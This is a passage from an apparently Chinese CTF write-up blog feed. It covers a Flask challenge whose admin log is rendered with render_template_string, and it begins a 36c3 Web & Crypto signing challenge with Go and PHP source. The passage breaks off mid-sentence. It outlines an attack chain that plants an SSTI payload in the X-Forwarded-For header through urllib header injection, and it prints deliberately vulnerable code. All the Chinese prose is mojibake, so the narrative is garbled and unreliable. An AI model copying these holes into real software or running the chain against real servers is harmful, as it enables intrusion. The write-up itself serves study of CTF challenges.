!= rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;admin_remote.html&quot;</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.2&quot;</span> <span class="keyword">and</span> request.args.get(<span class="string">&quot;body&quot;</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">&quot;body&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span>():</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn&#x27;t allow to show ticket</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>) != <span class="string">&quot;AdminBrowser/1.337&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;ticket&quot;</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">&quot;ticket&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="built_in">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">&quot;X-Forwarded-For&quot;</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_read</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line">    </span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span>(<span class="params">rip</span>):</span></span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">&quot;Admin page accessed from %s&quot;</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_extend_log</span>(<span class="params">rip, body</span>):</span></span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_log</span>(<span class="params">ticket</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¯ä»¥å‘ç°æˆ‘ä»¬ flag åœ¨ config ä¸­ï¼Œæƒ³åˆ° SSTIã€‚</p><p>é¢˜ç›®è¿˜æä¾›äº†ä¸€ä¸ªç±»ä¼¼ SSRF çš„åŠŸèƒ½ï¼Œè®©æœåŠ¡å™¨å¸®æˆ‘ä»¬å»è¯·æ±‚ï¼Œè¿™é‡Œç”¨çš„æ˜¯ <code>urllib2.urlopen(url)</code>ï¼Œè¿™é‡Œå­˜åœ¨ http å¤´æ³¨å…¥çš„é—®é¢˜ã€‚</p><p>å†çœ‹ä¸€ä¸‹ admin æ¥å£ï¼Œä¼šæŠŠ ripï¼Œä¹Ÿå°±æ˜¯ xff å¤´å†™åˆ°æ—¥å¿—é‡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ /admin/ticket æ¥å£æ¥è®¿é—®æ—¥å¿—ï¼ˆå½“ç„¶æˆ‘ä»¬æœ‰äº†ç›®å½•éå†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½ï¼‰</p><p>å¦‚ä½•æ‰èƒ½ SSTI å‘¢ï¼Œå½“è®¿é—® /admin/ticket æ¥å£æ—¶ä¼šæŠŠæ—¥å¿—ç»“æœç”¨ <code>render_template_string</code>æ¸²æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¾ˆæ¸…æ¥šäº†ï¼šæŠŠ SSTI payload å…ˆæ”¾åˆ° xff å¤´é‡Œï¼Œè®¿é—® admin æ¥å£æŠŠ payload å†™åˆ°æ—¥å¿—é‡Œï¼Œå†å»è®¿é—® /admin/ticket æ¥å£å®ç° SSTIï¼Œå¤´éƒ¨æ§åˆ¶å¯ä»¥åˆ©ç”¨ urllib çš„ HTTP æ³¨å…¥ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>é¦–å…ˆè¯·æ±‚ /admin:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6a5358e38937fa6e.png" alt="image.png"></p><p>å¾—åˆ° ticketï¼Œå†è¯·æ±‚ /admin/ticketï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6f4b3bcd8936cf22.png" alt="image.png"></p><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://ctftime.org/writeup/18264">https://ctftime.org/writeup/18264</a></p></li><li><p><a href="https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp">https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36c3 ä¸€é“Web&amp;Cryptoé¢˜</title>
      <link href="/2020/01/08/2019-36c3/"/>
      <url>/2020/01/08/2019-36c3/</url>
      
        <content type="html"><![CDATA[<p>36c3 çš„æ—¶å€™çœ‹äº†å¾ˆä¹…<code>SaV-ls-l-aaS</code>è¿™é“é¢˜ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œè¿™é“é¢˜çš„åˆ†ç±»æ˜¯Web&amp;Cryptoï¼Œèµ›åçœ‹äº†é¢˜è§£æ„Ÿè§‰é¢˜çš„è´¨é‡å¾ˆé«˜ï¼Œå‡ºçš„å¾ˆå·§å¦™çš„ä¸€é“é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><a id="more"></a><p>é¦–å…ˆæ‹ä¸€ä¸‹æµç¨‹ï¼š</p><p>60601ç«¯å£å¼€ç€ä¸€ä¸ªWebæœåŠ¡ï¼Œé¢˜ç›®æè¿°ç»™äº†è¿æ¥æ–¹æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;http://78.47.240.226:60601&#x27;</span> &amp;&amp; ip=$(curl -s <span class="string">&quot;<span class="variable">$url</span>/ip&quot;</span>) &amp;&amp; sig=$(curl -s -d <span class="string">&quot;cmd=ls -l&amp;ip=<span class="variable">$ip</span>&quot;</span> <span class="string">&quot;<span class="variable">$url</span>/sign&quot;</span>) &amp;&amp; curl --data-urlencode <span class="string">&quot;signature=<span class="variable">$sig</span>&quot;</span> <span class="string">&quot;<span class="variable">$url</span>/exec&quot;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå…ˆæ˜¯è®¿é—® <code>/ip</code> å¾—åˆ° ipï¼Œå†å‘ <code>/sign</code> post è¿‡å» ip å’Œæˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¾—åˆ°ç­¾åï¼Œæœ€åå‘ <code>/exec</code> post signature æ¥æ‰§è¡Œå‘½ä»¤ã€‚æˆ‘ä»¬æ‰§è¡Œè¿™ä¸€è¡Œå¯ä»¥å‘ç°å›æ˜¾äº†<code>ls -l</code>æ‰§è¡Œçš„ç»“æœï¼Œå‘ç°æœ‰ä¸ª flag.txtã€‚</p><p>çœ‹æºç ï¼ŒWeb æœåŠ¡æ˜¯ç”± go èµ·çš„ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := http.NewServeMux()</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/ip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprint(w, ip)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ip = r.PostFormValue(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">signIP := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, not ip :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := r.PostFormValue(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> cmd != <span class="string">&quot;ls -l&quot;</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, nope :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg := ip + <span class="string">&quot;|&quot;</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">&quot;http://127.0.0.1/index.php?action=sign&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is down&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is bodyless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature <span class="keyword">string</span></span><br><span class="line">err = json.Unmarshal(body, &amp;signature)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is jsonless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Fprint(w, signature+msg)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/exec&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature := r.PostFormValue(<span class="string">&quot;signature&quot;</span>)</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(signature[<span class="number">172</span>:]))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(signature[:<span class="number">172</span>] + <span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, json encode&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">&quot;http://127.0.0.1/index.php?action=verify&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is down?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is bodyless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid <span class="keyword">bool</span></span><br><span class="line">err = json.Unmarshal(body, &amp;valid)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, json unmarshal&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> valid &#123;</span><br><span class="line">t := strings.Split(signature[<span class="number">172</span>:], <span class="string">&quot;|&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(t) != <span class="number">2</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, split&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signIP := net.ParseIP(t[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, not ip :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn, err := net.DialTimeout(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:1024&quot;</span>, <span class="number">1</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, dial&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(conn, t[<span class="number">1</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.(*net.TCPConn).CloseWrite()</span><br><span class="line">io.Copy(w, conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           <span class="string">&quot;:60601&quot;</span>,</span><br><span class="line">Handler:        m,</span><br><span class="line">ReadTimeout:    <span class="number">5</span> * time.Second,</span><br><span class="line">WriteTimeout:   <span class="number">5</span> * time.Second,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">log.Fatal(s.ListenAndServe())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç å¾ˆå®¹æ˜“çœ‹ï¼Œé™åˆ¶äº† cmd åªèƒ½æ˜¯<code>ls -l</code>ï¼Œå…¶ä½™ä¸ç»™ç­¾åï¼Œçœ‹æ ·å­æˆ‘ä»¬æ˜¯è¦ä¼ªé€ å…¶ä»–å‘½ä»¤çš„ç­¾åæ¥è¯»flagï¼Œè¿™é‡Œæ³¨æ„åˆ°ç­¾åå’ŒéªŒç­¾çš„è¿‡ç¨‹æ˜¯ä¼ ç»™æœ¬åœ°èµ·çš„ä¸€ä¸ª php æ¥å®Œæˆçš„ï¼Œçœ‹ä¸€ä¸‹è¿™éƒ¨åˆ†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;ALGO&#x27;</span>, <span class="string">&#x27;md5WithRSAEncryption&#x27;</span>);</span><br><span class="line">$d = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), JSON_THROW_ON_ERROR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;sign&#x27;</span>)&#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_private(<span class="string">&quot;file:///var/www/private_key.pem&quot;</span>);</span><br><span class="line">    openssl_sign($d, $signature, $pkeyid, ALGO);</span><br><span class="line"><span class="keyword">echo</span> json_encode(base64_encode($signature));</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_GET[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;verify&#x27;</span>) &#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_public(<span class="string">&quot;file:///var/www/public_key.pem&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(openssl_verify(substr($d, <span class="number">172</span>), base64_decode(substr($d,<span class="number">0</span>, <span class="number">172</span>)), $pkeyid, ALGO) === <span class="number">1</span>);</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡‡ç”¨çš„æ˜¯<code>md5WithRSAEncryption</code>çš„æ–¹å¼ç­¾åï¼Œæœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯æŠŠæˆ‘ä»¬ä¼ å…¥çš„ <code>$d</code> md5 åè½¬ä¸ºhexï¼Œå¡«å……åˆ°<code>0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410</code>åé¢ï¼Œç»„æˆæ•°å­—ç„¶åç”¨RSAç­¾åã€‚</p><p>çœ‹æ ·å­æ•´ä¸ªé€»è¾‘æ‰¾ä¸åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œç”¨çš„éƒ½æ˜¯æ ‡å‡†åº“ï¼ŒåŸºæœ¬æ— æ³•æ”»å‡»ã€‚æˆ‘åˆæ­¥çš„æƒ³æ³•æ˜¯é€šè¿‡ä»£ç†æ›´æ¢ ipï¼Œå¯ä»¥æ‹¿åˆ°ä¸¤ä¸ª ip|ls -l çš„ç­¾åï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¥æœ‰äº†ä¸¤ç»„ RSA çš„ m å’Œ cï¼Œå› ä¸ºé¢˜ç›®ç»™äº† dockerfile ç»™äº†ç”Ÿæˆå…¬ç§é’¥çš„æ–¹æ³•ï¼Œä½¿ç”¨ openssl é»˜è®¤ç”Ÿæˆï¼Œeä¸º65537ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ±‚å…¬å› æ•°çš„æ–¹å¼æ¥æ±‚å‡º nã€‚</p><p>åœ¨å¾—åˆ°ä¸¤ç»„ç­¾ååï¼Œæˆ‘ä»¬è¦å¾—åˆ° RSA çš„mï¼Œå°±æ˜¯å¡«å……åçš„æ•°ï¼Œæ‰€ä»¥æŒ‰ç…§ä»£ç é€»è¾‘ï¼Œåœ¨ go é‡Œé¢å…ˆæ˜¯ sha1:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msg := ip + <span class="string">&quot;|&quot;</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br></pre></td></tr></table></figure><p>å† php é‡Œçš„ md5ï¼Œå¾—åˆ°ä¸¤ç»„ m å’Œ cï¼Œä½†æ˜¯æ€»æ˜¯æ±‚ä¸å‡ºå…¬å› æ•° nï¼Œæ€€ç–‘æˆ‘ä»¬æ±‚çš„ m ä¸å¯¹ã€‚çœ‹ä»£ç å‘ç° go é‡ŒæŠŠ sha1çš„ç»“æœç”¨ json ç¼–ç ï¼Œç„¶åä¼ åˆ° phpé‡Œ json è§£ç ã€‚è¿™éƒ¨åˆ†éå¸¸å¯ç–‘ï¼Œä¸ºä½•è¦ç”¨ json ç¼–ç ï¼ˆç”¨ hex ä¼ è¿‡å»å®ƒä¸é¦™ä¹ˆï¼‰ï¼Œæ‰€ä»¥æœ¬åœ°æ­ä¸€ä¸‹ç¯å¢ƒè·Ÿä¸€ä¸‹ï¼ˆé¢˜ç›®ç»™äº†dockerfileï¼‰</p><p>èµ·ä¸€ä¸ªdockerï¼Œæ”¹ä¸€ä¸‹ 